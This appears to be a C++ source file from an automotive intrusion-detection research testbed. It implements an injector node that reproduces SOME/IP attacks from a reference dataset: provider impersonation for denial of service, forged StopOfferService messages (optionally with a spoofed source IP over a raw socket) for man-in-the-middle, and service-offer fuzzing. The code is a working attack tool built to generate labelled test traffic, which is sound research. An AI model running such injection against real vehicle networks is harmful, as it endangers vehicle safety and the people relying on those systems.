/**
 * @file      injector_ecu.cpp
 * @author    Guilherme Frick (frickoliveira.ee@gmail.com)
 * @brief     Injector of adversarial scenarios: an ECU on the live bus that reproduces, through the
 *            real SOME/IP stack, what the attacker nodes of the reference dataset do on the wire.
 * @version   1.1
 * @date      2026-11-02
 * @copyright Copyright (c) 2026
 *
 * @details   WHY A LIVE NODE. The earlier post-capture injection pasted bursts into a PCAP, and
 *            the reference dataset turned out to contain something else: Service Discovery attacks
 *            made by vsomeip applications, in which the VICTIMS subscribe to the attacker and open
 *            the TCP connection to it (tools/attack_flows.py). That only happens on a live bus, so
 *            the scenario has to run on one. This node does only what an ECU on the same Ethernet
 *            can do by following the protocol; nothing the stack would not allow.
 *
 * @details   SCENARIOS, each one the signature measured in the dataset:
 *            - @c dos: impersonate the provider named by @c INJ_IMPERSONATE (the VDE, node_10):
 *              same service, instance and published event, read from the matrix; the vsomeip
 *              configuration (tools/gen_injector_config.py) gives it another address and offers
 *              every 20 ms. It declares ONLY the event it publishes, which is what makes it accept
 *              the ADAS and refuse CLU, PT and TEL, as the dataset attacker does. It publishes a
 *              constant payload. Captures victims only when up BEFORE the real provider.
 *            - @c mitm_single: the same impersonation, offers every 10 ms, entering AFTER the real
 *              provider. What captures the victim is a StopOfferService sent to it in the name of
 *              the VDE, every ~2.5 s, from this node's own address through an ordinary UDP socket
 *              (src/nodes/SdRawEmitter.hpp). It then publishes the attacker's own false signal,
 *              replayed in order from a bank (tools/extract_attacker_payloads.py), every 10 ms.
 *            - @c fuzzy: offer @c INJ_FUZZ_COUNT services from @c INJ_FUZZ_FIRST, instance equal to
 *              the service identifier, publishing nothing.
 *
 * @details   Environment:
 *            - @c INJ_SCENARIO          @c dos, @c mitm_single or @c fuzzy; required.
 *            - @c INJ_APP               vsomeip application name; must match the configuration. Default @c injector.
 *            - @c INJ_LOCAL_IP          this node's address; needed by the StopOffer sender.
 *            - @c INJ_IMPERSONATE       matrix node to impersonate. Default @c node_10.
 *            - @c INJ_PUBLISH_EVENT     the one event to publish. Default 0x0001.
 *            - @c INJ_PERIOD_MS         publishing period. Default 21 (dos) or 10 (mitm_single).
 *            - @c INJ_PAYLOAD           @c constant (default for dos) or @c bank (default for mitm_single).
 *            - @c INJ_PAYLOAD_HEX       the constant payload. Default: the one in the dataset.
 *            - @c INJ_PAYLOAD_FILE      the bank. Default build/cfg/attacker-mitm_single.bin.
 *            - @c INJ_DECLARE           @c published (default) or @c all events of the impersonated provider.
 *            - @c INJ_SO_TARGET_NODE    matrix node that receives the StopOffer. Default node_2 (ADAS) in mitm_single;
 *                                       unset in dos, where no StopOffer is sent.
 *            - @c INJ_SO_PERIOD_MS      StopOffer period. Default 2500.
 *            - @c INJ_SO_MODE           @c udp (own address, ordinary socket) or @c raw (forged source, raw socket).
 *            - @c INJ_SO_SRC_IP         raw mode: source address to forge. Default the impersonated node's.
 *            - @c INJ_SO_SESSION        @c fixed (always 1) or @c increment.
 *            - @c INJ_FUZZ_FIRST        fuzzy: first service. Default 0x2001.
 *            - @c INJ_FUZZ_COUNT        fuzzy: how many services. Default 200.
 *            - @c INJ_RUN_SECONDS       stop by itself after this long; zero waits for a signal.
 *            - @c INJ_READY_TIMEOUT_MS  wait for the routing manager. Default 10000.
 *            - @c INJ_REPORT_SECONDS    period of the counters line; default 5, zero silences it.
 */
#include <atomic>
#include <chrono>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <memory>
#include <string>
#include <thread>
#include <vector>

#include "src/libecu/NodeRuntime.hpp"
#include "src/nodes/MatrixPlan.hpp"
#include "src/nodes/PayloadBank.hpp"
#include "src/nodes/SdRawEmitter.hpp"

namespace
{

/// Set by the signal handler so the loop can leave cleanly.
std::atomic<bool> g_stop(false);

/**
 * @brief Handler for SIGINT and SIGTERM.
 * @param[in] signalNumber Signal received; not used.
 * @return None.
 */
void OnSignal(int signalNumber)
{
    static_cast<void>(signalNumber);
    g_stop.store(true);
}

constexpr std::uint32_t             kDefaultReadyMs = 10000U; ///< Default wait for the routing manager.
constexpr std::uint32_t             kDefaultReportS = 5U;     ///< Default period of the counters line.
constexpr std::uint16_t             kSdPort         = 30490U; ///< Service Discovery port.
constexpr std::chrono::milliseconds kIdleStep{100};           ///< Longest sleep with nothing due.

/// The constant payload the dataset DoS attacker publishes (tools/attacker_payload.py): 24 bytes, all 69 393 notifications.
const char *const kDatasetPayloadHex = "2f1a16d52afcf4d9becd0bc30b01e17bb222ab1d9f852e72";

/**
 * @brief Read an environment variable as text.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset or empty.
 * @return The value, or @p fallback.
 */
std::string Env(const char *name, const char *fallback)
{
    const char *const v = std::getenv(name);
    return ((v != nullptr) && (v[0] != '\0')) ? std::string(v) : std::string(fallback);
}

/**
 * @brief Read an environment variable as an unsigned number, decimal or 0x-prefixed hexadecimal.
 * @param[in] name     Variable to read.
 * @param[in] fallback Value to use when it is unset, empty or not a number.
 * @return The value, or @p fallback.
 */
std::uint32_t EnvNumber(const char *name, std::uint32_t fallback)
{
    const std::string text = Env(name, "");
    if (text.empty())
    {
        return fallback;
    }
    else
    {
        /* Something was set: try to read it. */
    }
    char *end             = nullptr;
    const unsigned long v = std::strtoul(text.c_str(), &end, 0);
    return ((end != nullptr) && (*end == '\0')) ? static_cast<std::uint32_t>(v) : fallback;
}

/**
 * @brief Decode a hexadecimal string.
 * @param[in]  text  Even number of hexadecimal digits.
 * @param[out] bytes Decoded bytes.
 * @return Whether the text was valid.
 */
bool DecodeHex(const std::string &text, std::vector<std::uint8_t> &bytes)
{
    bytes.clear();
    if ((text.size() % 2U) != 0U)
    {
        return false;
    }
    else
    {
        /* Even length. */
    }
    for (std::size_t i = 0U; i < text.size(); i += 2U)
    {
        char             *end = nullptr;
        const std::string par = text.substr(i, 2U);
        const unsigned long v = std::strtoul(par.c_str(), &end, 16);
        if ((end == nullptr) || (*end != '\0'))
        {
            return false;
        }
        else
        {
            bytes.push_back(static_cast<std::uint8_t>(v));
        }
    }
    return true;
}

/**
 * @brief Address of a matrix node.
 * @param[in]  name Node name.
 * @param[out] ip   Host byte order.
 * @return Whether the node exists and its address parses.
 */
bool IpDoNo(const std::string &name, std::uint32_t &ip)
{
    const ids::matrix::table::Table<ids::matrix::table::NodeDesc> nos = ids::matrix::table::Nodes();
    for (std::size_t i = 0U; i < nos.count; ++i)
    {
        if (name == nos.items[i].name)
        {
            return ids::nodes::ParseIpv4(nos.items[i].ip, ip);
        }
        else
        {
            /* Keep looking. */
        }
    }
    return false;
}

/**
 * @brief Everything needed to send the StopOffer, prepared before the stack comes up.
 */
struct StopOfferPlan
{
    bool                      ativo   = false;   ///< Whether this scenario sends it.
    bool                      bruto   = false;   ///< Raw socket with forged source, or ordinary UDP socket.
    bool                      sessaoIncrementa = false; ///< Session counts up, or stays 1.
    ids::nodes::StopOfferSpec spec;              ///< What the entry withdraws.
    ids::nodes::RawHeaderSpec cabecalho;         ///< Raw mode: IPv4 and UDP header fields.
    std::uint32_t             destino = 0U;      ///< Victim address.
    std::uint32_t             periodoMs = 0U;    ///< Sending period.
};

} // namespace

int main()
{
    static_cast<void>(std::setvbuf(stdout, nullptr, _IOLBF, 0));

    const std::string cenario = Env("INJ_SCENARIO", "");
    const bool        personifica = (cenario == "dos") || (cenario == "mitm_single");
    if ((!personifica) && (cenario != "fuzzy"))
    {
        std::printf("[injector] ERRO: INJ_SCENARIO deve ser dos, mitm_single ou fuzzy (veio \"%s\")\n", cenario.c_str());
        return 2;
    }
    else
    {
        /* A known scenario. */
    }

    const std::string   app        = Env("INJ_APP", "injector");
    const std::uint32_t runSegs    = EnvNumber("INJ_RUN_SECONDS", 0U);
    const std::uint32_t prontoMs   = EnvNumber("INJ_READY_TIMEOUT_MS", kDefaultReadyMs);
    const std::uint32_t reportSegs = EnvNumber("INJ_REPORT_SECONDS", kDefaultReportS);

    /* ---- what to declare, decided before the stack exists ---- */

    ids::nodes::NodePlan       plano;
    std::vector<std::uint8_t>  constante;
    ids::nodes::PayloadBank    banco;
    ids::nodes::PayloadStream *fluxo      = nullptr;
    ids::ecu::EventId          eventoAlvo = 0U;
    ids::nodes::EventPlan      publicado;
    bool                       achouEvento  = false;
    std::uint32_t              periodoMs    = 0U;
    StopOfferPlan              so;
    const std::uint32_t        fuzzPrimeiro = EnvNumber("INJ_FUZZ_FIRST", 0x2001U);
    const std::uint32_t        fuzzQuantos  = EnvNumber("INJ_FUZZ_COUNT", 200U);

    if (personifica)
    {
        const std::string alvo = Env("INJ_IMPERSONATE", "node_10");
        plano                  = ids::nodes::PlanFor(alvo.c_str());
        if ((plano.node == nullptr) || (!plano.problem.empty()) || (plano.node->provideCount == 0U))
        {
            std::printf("[injector] ERRO: %s não é um provedor usável da matriz (%s)\n", alvo.c_str(), plano.problem.c_str());
            return 2;
        }
        else
        {
            /* A provider to impersonate. */
        }

        eventoAlvo = static_cast<ids::ecu::EventId>(EnvNumber("INJ_PUBLISH_EVENT", 0x0001U));
        periodoMs  = EnvNumber("INJ_PERIOD_MS", (cenario == "dos") ? 21U : 10U);
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            if (plano.publishes[i].notifier == eventoAlvo)
            {
                publicado   = plano.publishes[i];
                achouEvento = true;
            }
            else
            {
                /* Not the published one. */
            }
        }
        if (!achouEvento)
        {
            std::printf("[injector] ERRO: %s não publica o evento 0x%04X\n", alvo.c_str(), static_cast<unsigned>(eventoAlvo));
            return 2;
        }
        else
        {
            /* Event found. */
        }

        /* Conteúdo. O DoS do dataset publica um payload constante; o MITM single, um sinal
         * falso próprio, que o banco reproduz em ordem. Um banco ruim é fatal: seguir com
         * outro conteúdo produziria uma rodada que parece a pedida e mede outra coisa. */
        const std::string politica = Env("INJ_PAYLOAD", (cenario == "dos") ? "constant" : "bank");
        if (politica == "bank")
        {
            const std::string arquivo = Env("INJ_PAYLOAD_FILE", "build/cfg/attacker-mitm_single.bin");
            banco                     = ids::nodes::PayloadBank::FromFile(arquivo);
            fluxo = banco.Problem().empty() ? banco.Find(publicado.service, publicado.notifier) : nullptr;
            if (fluxo == nullptr)
            {
                std::printf("[injector] ERRO no banco %s: %s\n", arquivo.c_str(),
                            banco.Problem().empty() ? "não tem o evento publicado" : banco.Problem().c_str());
                return 2;
            }
            else if (fluxo->SampleSize() != publicado.bytes)
            {
                std::printf("[injector] ERRO: o banco tem %zu B e a matriz %zu B\n", fluxo->SampleSize(), publicado.bytes);
                return 2;
            }
            else
            {
                std::printf("[injector] conteúdo: banco %s\n", arquivo.c_str());
            }
        }
        else if (!DecodeHex(Env("INJ_PAYLOAD_HEX", kDatasetPayloadHex), constante))
        {
            std::printf("[injector] ERRO: INJ_PAYLOAD_HEX não é hexadecimal válido\n");
            return 2;
        }
        else
        {
            std::printf("[injector] conteúdo: %zu B constantes\n", constante.size());
        }

        /* StopOffer em nome do personificado: o que faz a vítima largar o provedor legítimo
         * no MITM. Os endpoints são os DELE, lidos da matriz, como no quadro do dataset. */
        const std::string alvoSo = Env("INJ_SO_TARGET_NODE", (cenario == "mitm_single") ? "node_2" : "");
        if (!alvoSo.empty())
        {
            const ids::matrix::table::ServiceDesc *const svc = ids::matrix::table::FindService(plano.node->provides[0]);
            so.ativo            = true;
            so.bruto            = (Env("INJ_SO_MODE", "udp") == "raw");
            so.sessaoIncrementa = (Env("INJ_SO_SESSION", "fixed") == "increment");
            so.periodoMs        = EnvNumber("INJ_SO_PERIOD_MS", 2500U);
            so.spec.service     = svc->id;
            so.spec.instance    = svc->instance;
            so.spec.tcpPort     = svc->hasTcp ? svc->tcpPort : static_cast<ids::ecu::Port>(0U);
            so.spec.udpPort     = svc->hasUdp ? svc->udpPort : static_cast<ids::ecu::Port>(0U);
            bool ok             = ids::nodes::ParseIpv4(plano.node->ip, so.spec.providerIp) && IpDoNo(alvoSo, so.destino);
            if (so.bruto)
            {
                ok = ok && ids::nodes::ParseIpv4(Env("INJ_SO_SRC_IP", plano.node->ip), so.cabecalho.srcIp);
                so.cabecalho.dstIp        = so.destino;
                so.cabecalho.dontFragment = false;
                so.cabecalho.udpChecksum  = false;
            }
            else
            {
                /* Ordinary socket: the kernel fills the headers. */
            }
            if (!ok)
            {
                std::printf("[injector] ERRO: endereços do StopOffer inválidos (alvo %s)\n", alvoSo.c_str());
                return 2;
            }
            else
            {
                std::printf("[injector] StopOffer de 0x%04X em nome de %s para %s a cada %u ms, %s, sessão %s\n",
                            static_cast<unsigned>(svc->id), alvo.c_str(), alvoSo.c_str(), static_cast<unsigned>(so.periodoMs),
                            so.bruto ? "socket bruto com origem forjada" : "socket UDP do próprio IP",
                            so.sessaoIncrementa ? "incrementando" : "fixa em 1");
            }
        }
        else
        {
            /* No StopOffer in this scenario. */
        }

        std::printf("[injector] %s: personifica %s (%s), publica só 0x%04X a cada %u ms\n", cenario.c_str(), alvo.c_str(),
                    plano.node->appName, static_cast<unsigned>(eventoAlvo), static_cast<unsigned>(periodoMs));
    }
    else
    {
        std::printf("[injector] fuzzy: oferece %u serviço(s) a partir de 0x%04X, sem publicar\n", static_cast<unsigned>(fuzzQuantos),
                    static_cast<unsigned>(fuzzPrimeiro));
    }

    /* Os sockets do StopOffer abrem ANTES da pilha subir: falhar aqui é falhar cedo, sem
     * deixar um atacante no ar que não faz o que o cenário diz. */
    ids::nodes::UdpSdSender udpSo;
    ids::nodes::RawIpSender rawSo;
    if (so.ativo)
    {
        std::string erro;
        if (so.bruto)
        {
            erro = rawSo.Open();
        }
        else
        {
            std::uint32_t local = 0U;
            erro = ids::nodes::ParseIpv4(Env("INJ_LOCAL_IP", ""), local) ? udpSo.Open(local, kSdPort)
                                                                          : std::string("INJ_LOCAL_IP ausente ou inválido");
        }
        if (!erro.empty())
        {
            std::printf("[injector] ERRO abrindo o emissor de StopOffer: %s\n", erro.c_str());
            return 1;
        }
        else
        {
            /* Sender ready. */
        }
    }
    else
    {
        /* Nothing to open. */
    }

    ara::core::Result<std::unique_ptr<ids::ecu::NodeRuntime>> criado = ids::ecu::NodeRuntime::Create(app);
    if (!criado.HasValue())
    {
        std::printf("[injector] ERRO criando o runtime: %s\n", criado.Error().Message());
        return 1;
    }
    else
    {
        /* Application created. */
    }
    ids::ecu::NodeRuntime &runtime = *criado.Value();

    /* Depois do Create(), pelo mesmo motivo do generic_ecu: o init() do vsomeip
     * sobrescreve um handler instalado antes. */
    std::signal(SIGINT, OnSignal);
    std::signal(SIGTERM, OnSignal);

    /* ---- declaração ---- */

    if (personifica)
    {
        for (std::size_t i = 0U; i < plano.node->provideCount; ++i)
        {
            const ids::matrix::table::ServiceDesc *const svc = ids::matrix::table::FindService(plano.node->provides[i]);
            const ara::core::Result<void>                r   = runtime.ProvideService(svc->id, svc->instance);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando %s: %s\n", plano.node->provides[i], r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
        /* Por padrão, SÓ o evento publicado. No dataset o .11 confirma a assinatura da
         * ADAS (52 177 Ack, eventgroup do evento 0x0001) e RECUSA as de CLU, PT e TEL
         * (~9 700 Nack cada, eventgroups 2, 3 e 4), que ficam reconectando. Declarar os
         * quatro eventos faz o injetor aceitar todo mundo, que não é o que o PCAP mostra.
         * INJ_DECLARE=all fica para comparação. */
        const bool declaraTodos = (Env("INJ_DECLARE", "published") == "all");
        for (std::size_t i = 0U; i < plano.publishes.size(); ++i)
        {
            const ids::nodes::EventPlan &ep = plano.publishes[i];
            if ((!declaraTodos) && (ep.notifier != eventoAlvo))
            {
                continue;
            }
            else
            {
                /* Declared. */
            }
            const ara::core::Result<void> r =
                runtime.ProvideEvent(ep.service, ep.instance, ep.notifier, ids::ecu::EventgroupIds(ep.eventgroups.data(), ep.eventgroups.size()),
                                     ep.isField, std::chrono::milliseconds::zero(), ep.transport);
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando evento 0x%04X: %s\n", static_cast<unsigned>(ep.notifier), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }
    else
    {
        for (std::uint32_t i = 0U; i < fuzzQuantos; ++i)
        {
            const ids::ecu::ServiceId     svc = static_cast<ids::ecu::ServiceId>(fuzzPrimeiro + i);
            const ara::core::Result<void> r   = runtime.ProvideService(svc, static_cast<ids::ecu::InstanceId>(svc));
            if (!r.HasValue())
            {
                std::printf("[injector] ERRO declarando 0x%04X: %s\n", static_cast<unsigned>(svc), r.Error().Message());
                return 1;
            }
            else
            {
                /* Declared. */
            }
        }
    }

    /* ---- subida ---- */

    const ara::core::Result<void> iniciado = runtime.Start();
    if (!iniciado.HasValue())
    {
        std::printf("[injector] ERRO subindo a pilha: %s\n", iniciado.Error().Message());
        return 1;
    }
    else
    {
        /* Stack coming up. */
    }
    const ara::core::Result<void> registrado = runtime.WaitUntilRegistered(std::chrono::milliseconds(prontoMs));
    if (!registrado.HasValue())
    {
        std::printf("[injector] ERRO: %s\n", registrado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] registrado no routing manager\n");
    }
    const ara::core::Result<void> ofertado = runtime.Offer();
    if (!ofertado.HasValue())
    {
        std::printf("[injector] ERRO ofertando: %s\n", ofertado.Error().Message());
        return 1;
    }
    else
    {
        std::printf("[injector] ofertas no ar\n");
    }

    /* ---- laço ---- */

    const std::chrono::steady_clock::time_point inicio        = std::chrono::steady_clock::now();
    std::chrono::steady_clock::time_point       proximoEnvio  = inicio;
    std::chrono::steady_clock::time_point       proximoSo     = inicio;
    std::chrono::steady_clock::time_point       proximoReport = inicio + std::chrono::seconds(reportSegs);
    std::uint64_t                               enviados      = 0U;
    std::uint64_t                               falhas        = 0U;
    std::uint64_t                               stopOffers    = 0U;
    std::uint16_t                               sessaoSo      = 1U;
    std::uint16_t                               ipId          = 1U;

    while (!g_stop.load())
    {
        if (!runtime.IsRegistered())
        {
            std::printf("[injector] a pilha saiu do ar; encerrando\n");
            break;
        }
        else
        {
            /* Still registered. */
        }
        const std::chrono::steady_clock::time_point agora = std::chrono::steady_clock::now();
        if ((runSegs > 0U) && (agora >= (inicio + std::chrono::seconds(runSegs))))
        {
            break;
        }
        else
        {
            /* Keep running. */
        }

        std::chrono::steady_clock::time_point acorda = agora + kIdleStep;

        if (personifica && (agora >= proximoEnvio))
        {
            ids::ecu::ByteView bytes = (fluxo != nullptr) ? fluxo->Next() : ids::ecu::ByteView(constante.data(), constante.size());
            const ara::core::Result<void> r = runtime.Send(publicado.service, publicado.instance, publicado.notifier, bytes);
            if (r.HasValue())
            {
                ++enviados;
            }
            else
            {
                ++falhas;
            }
            /* Avança a partir do previsto, não de agora, para a taxa média não escorregar. */
            proximoEnvio += std::chrono::milliseconds(periodoMs);
            if (proximoEnvio < agora)
            {
                proximoEnvio = agora + std::chrono::milliseconds(periodoMs);
            }
            else
            {
                /* On schedule. */
            }
        }
        else
        {
            /* Nothing to publish now. */
        }
        if (personifica && (proximoEnvio < acorda))
        {
            acorda = proximoEnvio;
        }
        else
        {
            /* The idle step comes first. */
        }

        if (so.ativo && (agora >= proximoSo))
        {
            so.spec.session                     = sessaoSo;
            const std::vector<std::uint8_t> msg = ids::nodes::BuildStopOffer(so.spec);
            bool                            ok  = false;
            if (so.bruto)
            {
                so.cabecalho.ipId = ipId;
                ++ipId;
                ok = rawSo.Send(ids::nodes::BuildIpv4Udp(so.cabecalho, msg), so.destino);
            }
            else
            {
                ok = udpSo.Send(msg, so.destino, kSdPort);
            }
            if (ok)
            {
                ++stopOffers;
            }
            else
            {
                ++falhas;
            }
            if (so.sessaoIncrementa)
            {
                sessaoSo = static_cast<std::uint16_t>((sessaoSo == 0xFFFFU) ? 1U : (sessaoSo + 1U));
            }
            else
            {
                /* Fixed at 1, as the single-node attacker of the dataset. */
            }
            proximoSo = agora + std::chrono::milliseconds(so.periodoMs);
        }
        else
        {
            /* Not due. */
        }
        if (so.ativo && (proximoSo < acorda))
        {
            acorda = proximoSo;
        }
        else
        {
            /* The other deadlines come first. */
        }

        if ((reportSegs > 0U) && (agora >= proximoReport))
        {
            std::printf("[injector] %s: %llu enviados, %llu StopOffer, %llu falhas\n", cenario.c_str(),
                        static_cast<unsigned long long>(enviados), static_cast<unsigned long long>(stopOffers),
                        static_cast<unsigned long long>(falhas));
            proximoReport = agora + std::chrono::seconds(reportSegs);
        }
        else
        {
            /* Not time to report. */
        }
        std::this_thread::sleep_until(acorda);
    }

    runtime.StopOffer();
    std::printf("[injector] encerrando, %llu enviados, %llu StopOffer, %llu falhas\n", static_cast<unsigned long long>(enviados),
                static_cast<unsigned long long>(stopOffers), static_cast<unsigned long long>(falhas));
    return 0;
}
